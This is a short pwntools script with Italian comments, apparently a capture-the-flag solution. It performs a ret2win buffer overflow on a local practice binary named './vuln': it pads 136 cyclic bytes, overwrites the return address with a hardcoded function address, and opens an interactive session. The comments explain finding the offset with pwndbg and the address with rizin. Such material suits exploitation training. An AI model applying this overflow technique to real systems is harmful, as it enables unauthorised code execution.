from pwn import *
#136 si può trovare con pwndbg inserendo una stringa cyclic molto alta e poi con cyclic_find trovarne la lunghezza giusta
trash = cyclic(136)
#con tool di decompilazione come rizin si trova l'indirizzo della funzione win
win = p64(0x004018c6)

payload = trash + win

p = process("./vuln")
p.sendline(b"144")
p.sendline(payload)

p.interactive()
